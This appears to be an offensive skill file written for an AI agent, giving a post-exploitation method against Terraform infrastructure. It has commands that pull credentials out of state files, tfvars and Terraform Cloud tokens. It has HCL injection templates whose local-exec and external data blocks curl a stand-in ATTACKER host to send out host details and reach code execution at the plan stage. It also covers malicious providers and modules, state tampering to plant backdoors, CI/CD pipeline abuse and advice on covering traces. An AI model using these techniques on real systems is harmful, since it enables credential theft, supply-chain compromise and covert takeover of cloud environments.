---
name: terraform-tactics
description: "Attacks against Terraform state files and infrastructure as code. Use when you find that the target manages its infrastructure with Terraform, locate a terraform.tfstate file, can reach a remote state backend (S3/Consul/HTTP), or can modify Terraform code repositories. Covers state file credential extraction, remote state backend abuse, provider credential theft, sensitive output extraction, tfvars variable file abuse, malicious resource injection, state tampering, module supply chain attacks, and CI/CD pipeline abuse"
zh-signals: "针对 Terraform 状态文件与基础设施即代码的攻击，覆盖 tfstate 凭据提取、远程 State 后端利用、Provider 凭据窃取、tfvars 利用、恶意资源注入与 Module 供应链攻击。信号:Terraform,tfstate,IaC,凭据提取,供应链,云安全"
when-to-use: >-
  Use when the target uses Terraform, you find a terraform.tfstate file, can reach a remote
  state backend such as S3/Consul/HTTP, or can modify Terraform code repositories.
metadata:
  tags: "terraform,tfstate,iac,infrastructure-as-code,state-file,tfvars,provider,module,supply-chain,hcl"
  category: "postexploit"
---

# Terraform State File and IaC Attack Methodology

Terraform stores the attributes of all managed resources (including passwords, keys, tokens) in plaintext in the state file. The state file is the core of Terraform attacks — obtaining the state is equivalent to obtaining a credential snapshot of the entire infrastructure. Moreover, Terraform's declarative nature means "code is infrastructure" — modifying `.tf` files or module references is enough to gain code execution during the plan/apply phase.

## Further Reading

Full attack technique details, per-resource-type credential extraction jq queries, and malicious resource injection templates:

→ Read [references/attack-techniques.md](references/attack-techniques.md)

## Phase 1: Environment Identification

Search the target system for the following Terraform indicator files to confirm how Terraform is used and map the attack surface:

| Indicator file/directory | Meaning | Attack value |
|---|---|---|
| `*.tf` | HCL configuration file | Resource definitions, provider configuration, backend configuration |
| `terraform.tfstate` / `*.tfstate` | Local state file | **Extremely high** — plaintext credentials, resource attributes |
| `terraform.tfstate.backup` | State backup | Same as above, often left forgotten on disk |
| `.terraform/` | Plugin cache directory | Provider binaries, module source cache |
| `.terraform.lock.hcl` | Dependency lock file | Provider version information |
| `*.tfvars` / `terraform.tfvars` | Variable value files | Sensitive variables such as database passwords and API keys |
| `*.auto.tfvars` | Auto-loaded variable files | Same as above |
| `.terraformrc` / `~/.terraform.d/credentials.tfrc.json` | CLI configuration and credentials | Terraform Cloud/Enterprise API tokens |
| `backend.tf` / `backend "s3"` block | Remote state backend configuration | Backend address, access credentials |

**Quick identification commands:**

```bash
# Search for Terraform-related files
find / -name "*.tf" -o -name "terraform.tfstate*" -o -name "*.tfvars" \
  -o -name ".terraformrc" -o -name "credentials.tfrc.json" 2>/dev/null

# Check environment variables
env | grep -iE "^TF_|^TERRAFORM_|^AWS_|^GOOGLE_|^ARM_"

# Check running processes
ps aux | grep -i terraform
```

## Phase 2: Attack Decision Tree

```
Terraform environment found
├── Found a tfstate file (local or backup)
│   └── → Phase 3: State file credential extraction (fastest path)
│
├── Have access to a remote state backend (S3/Consul/HTTP/Azure Blob/GCS)
│   ├── Download the state file → Phase 3: State file credential extraction
│   └── Have write access → Phase 5: State tampering (inject a malicious provider)
│
├── Found .terraformrc or credentials.tfrc.json
│   └── → Phase 3.3: Provider credential theft (Terraform Cloud token)
│
├── Found *.tfvars files
│   └── → Phase 3.4: tfvars variable file abuse (sensitive variable extraction)
│
├── Can modify .tf files (write access to the repository)
│   ├── → Phase 4: Malicious resource injection (local-exec provisioner → RCE)
│   └── → Phase 6: Module supply chain attack (replace the module source with a malicious repository)
│
├── Can modify tfvars files
│   └── → Phase 4.2: Variable tampering (modify resource parameters to gain persistence)
│
├── CI/CD pipeline triggers terraform plan/apply
│   └── → Phase 7: CI/CD pipeline abuse
│       ├── PR modifies .tf → RCE at plan stage (external data source)
│       └── PR modifies .tf → RCE at apply stage (local-exec provisioner)
│
└── Only the .terraform/ cache directory was found
    └── Inspect cached provider binaries and credentials in module sources
```

## Phase 3: State File Credential Extraction

The state file is the highest-value target in a Terraform attack. All resource attributes (including those marked `sensitive`) are stored in plaintext in the state.

### 3.1 Local State Files

```bash
# Search for all state files
find / -name "terraform.tfstate*" -o -name "*.tfstate" 2>/dev/null

# Global sensitive information search
grep -iE "password|secret|token|api_key|access_key|private_key" terraform.tfstate

# List all resource types
jq -r '.resources[].type' terraform.tfstate | sort -u
```

**Extract credentials by resource type (common high-value targets):**

```bash
# AWS IAM access key (the most common high-value target)
jq -r '.resources[] | select(.type=="aws_iam_access_key") |
  .instances[].attributes | {user: .user, id: .id, secret: .secret}' terraform.tfstate

# Database password (RDS/Aurora)
jq -r '.resources[] | select(.type=="aws_db_instance") |
  .instances[].attributes | {endpoint: .endpoint, username: .username, password: .password}' terraform.tfstate

# Extract sensitive values from all string attributes in one pass
jq -r '[.resources[].instances[].attributes | to_entries[] |
  select(.key | test("password|secret|token|key|credential"; "i")) |
  {key: .key, value: .value}] | unique_by(.value)' terraform.tfstate
```

→ Read [references/attack-techniques.md](references/attack-techniques.md) for the full list of per-resource-type credential extraction jq queries

### 3.2 Remote State Backend Abuse

```bash
# Identify the remote backend type from the backend configuration
grep -A 10 'backend' backend.tf || grep -A 10 'backend' *.tf

# S3 backend
aws s3 cp s3://BUCKET/PATH/terraform.tfstate /tmp/tfstate
aws s3 ls s3://BUCKET/PATH/  # may contain multiple state files and backups

# Consul backend
consul kv get terraform/state

# HTTP backend
curl -s STATE_URL

# Azure Blob
az storage blob download --container-name tfstate \
  --name terraform.tfstate --file /tmp/tfstate

# GCS backend
gsutil cp gs://BUCKET/PATH/terraform.tfstate /tmp/tfstate
```

### 3.3 Provider Credential Theft

```bash
# Terraform Cloud / Enterprise token
cat ~/.terraform.d/credentials.tfrc.json
# Extract the token
jq -r '.credentials["app.terraform.io"].token' ~/.terraform.d/credentials.tfrc.json

# Credentials in .terraformrc
cat ~/.terraformrc
cat .terraformrc

# Provider credentials in environment variables
env | grep -iE "^TF_VAR_|^AWS_|^GOOGLE_|^ARM_|^ALICLOUD_"

# A Terraform Cloud token can be used to:
# - List all workspaces → download all states → bulk credential extraction
# - Read workspace variables (including the values of sensitive variables)
# - Trigger a run → execute code on the runner
```

### 3.4 tfvars Variable File Abuse

```bash
# Search for variable files
find . -name "*.tfvars" -o -name "*.auto.tfvars" 2>/dev/null

# Read all variable files
cat terraform.tfvars
cat *.tfvars *.auto.tfvars 2>/dev/null

# Search for sensitive variables
grep -iE "password|secret|token|api_key|credential" *.tfvars 2>/dev/null
```

### 3.5 Sensitive Output Extraction

```bash
# List all outputs
terraform output

# Get all outputs in JSON format (including those marked sensitive)
terraform output -json

# Read sensitive outputs directly from the state (bypasses CLI masking)
jq -r '.outputs | to_entries[] | {name: .key, value: .value.value, sensitive: .value.sensitive}' terraform.tfstate

# Force output of a specific sensitive value
terraform output -raw SECRET_OUTPUT_NAME
```

## Phase 4: Malicious Resource Injection

When you have write access to `.tf` files, you can inject malicious resources to achieve RCE or persistence.

### 4.1 local-exec Provisioner (RCE at the apply stage)

```hcl
# Execute a command via null_resource + local-exec
resource "null_resource" "exec" {
  provisioner "local-exec" {
    command = "curl http://ATTACKER/$(whoami)@$(hostname)"
  }
}
```

### 4.2 external Data Source (RCE at the plan stage)

**This is the most dangerous injection method — `terraform plan` alone triggers code execution, with no `apply` required.**

```hcl
data "external" "rce" {
  program = ["bash", "-c", "curl http://ATTACKER/$(whoami) >&2; echo '{}'"]
}
```

### 4.3 Malicious Provider

```hcl
# A custom provider can execute code during the init/plan/apply stages
terraform {
  required_providers {
    evil = {
      source  = "attacker/evil"
      version = "1.0.0"
    }
  }
}
```

→ Read [references/attack-techniques.md](references/attack-techniques.md) for the complete injection templates and backdoor resource examples

## Phase 5: State Tampering

When you have write access to the state file (a local file or a remote backend), you can tamper with the state directly to gain persistence.

```bash
# Edit the state directly (be careful — a malformed file breaks Terraform)
# Bump the serial number (it must increase)
jq '.serial += 1' terraform.tfstate > tmp.tfstate && mv tmp.tfstate terraform.tfstate

# Inject a malicious provider into the state → triggered on the next plan/init
# Modify existing resource attributes (e.g. privilege escalation, open ports, add backdoor users)
```

**Core objectives of state tampering:**
- Modify security group rules → open ports
- Modify IAM policies → escalate privileges
- Modify instance user_data → execute a backdoor on next boot
- Inject a malicious provider reference → RCE on the next init/plan

## Phase 6: Module Supply Chain Attack

Terraform modules are the core mechanism for code reuse. Compromising a module source affects every project that uses that module.

```hcl
# Normal module reference
module "vpc" {
  source  = "terraform-aws-modules/vpc/aws"
  version = "3.14.0"
}

# Attack method 1: replace with a malicious Git repository
module "vpc" {
  source = "git::https://attacker.com/evil-module.git"
}

# Attack method 2: tag hijacking when there is no version pinning
# If the source uses a Git tag instead of a commit hash, the tag can be force-pushed
module "vpc" {
  source = "git::https://github.com/org/module.git?ref=v1.0"
  # The attacker force-pushes the v1.0 tag to a malicious commit
}

# Attack method 3: private registry poisoning
# If a private module registry is used, obtaining registry write access lets you replace modules
```

**Module attack detection points:**
- Check whether the hashes in `.terraform.lock.hcl` were modified
- Check whether the module source points to an unexpected Git repository
- Check whether the module version uses a commit hash instead of a mutable tag

## Phase 7: CI/CD Pipeline Abuse

When Terraform is integrated with CI/CD (GitHub Actions + Terraform, Atlantis, Terraform Cloud), the attack surface expands further.

### 7.1 RCE at the Plan Stage

Many CI/CD pipelines automatically run `terraform plan` at the PR stage. With an `external` data source, `.tf` modifications in a PR can achieve RCE at the plan stage:

```
The attacker submits a PR (modifying .tf files)
  → CI/CD automatically triggers terraform plan
    → external data source executes code
      → Steal cloud credentials / secrets from the runner
```

### 7.2 Atlantis-Specific

```bash
# Atlantis is normally triggered by commenting `atlantis plan` on the PR
# If atlantis.yaml allows custom workflows (allow_custom_workflows=true):
# Add atlantis.yaml to the PR → define an arbitrary pre_workflow_hook → RCE

# The Atlantis server usually holds high-privilege cloud credentials
# After achieving RCE, inspect environment variables and credential files
```

### 7.3 Terraform Cloud / Enterprise

```bash
# Use the stolen TFC token
export TFE_TOKEN="STOLEN_TOKEN"

# List all organizations
curl -s -H "Authorization: Bearer $TFE_TOKEN" \
  https://app.terraform.io/api/v2/organizations

# List workspaces
curl -s -H "Authorization: Bearer $TFE_TOKEN" \
  "https://app.terraform.io/api/v2/organizations/ORG/workspaces"

# Read workspace variables (including sensitive variables)
curl -s -H "Authorization: Bearer $TFE_TOKEN" \
  "https://app.terraform.io/api/v2/workspaces/WS_ID/vars"

# Download the state (bulk credential extraction)
curl -s -H "Authorization: Bearer $TFE_TOKEN" \
  "https://app.terraform.io/api/v2/workspaces/WS_ID/current-state-version"
```

## Tool Quick Reference

| Tool | Purpose | Command |
|---|---|---|
| `jq` | State file parsing | `jq -r '.resources[].type' terraform.tfstate` |
| `terraform show` | Formatted state display | `terraform show` |
| `terraform state list` | List all resources | `terraform state list` |
| `terraform state show` | Inspect a single resource | `terraform state show aws_instance.web` |
| `terraform output` | Inspect output values | `terraform output -json` |
| `terraform providers` | List providers | `terraform providers` |
| `tfsec` | Terraform security scanning | `tfsec .` |
| `checkov` | IaC security audit | `checkov -d .` |
| `terrascan` | Compliance check | `terrascan scan` |

## Notes

**OpSec:**
- Both `terraform plan` and `terraform apply` generate audit logs (especially in Terraform Cloud/Enterprise)
- After modifying the state file, the serial number must increase, otherwise Terraform reports an error
- `terraform apply -auto-approve` applies changes directly and can cause severe impact in production environments
- Clean up promptly after injecting malicious resources to avoid leaving obvious traces

**State file handling:**
- State files can be very large (several MB) and contain a full infrastructure snapshot
- Always back up the original state before tampering with it
- The state locking mechanism (DynamoDB/Consul) may block concurrent writes

**Credential freshness:**
- Credentials in the state may have expired or been rotated
- Terraform Cloud tokens usually have a long validity period
- Temporary credentials (STS tokens) may have expired and need to be re-obtained
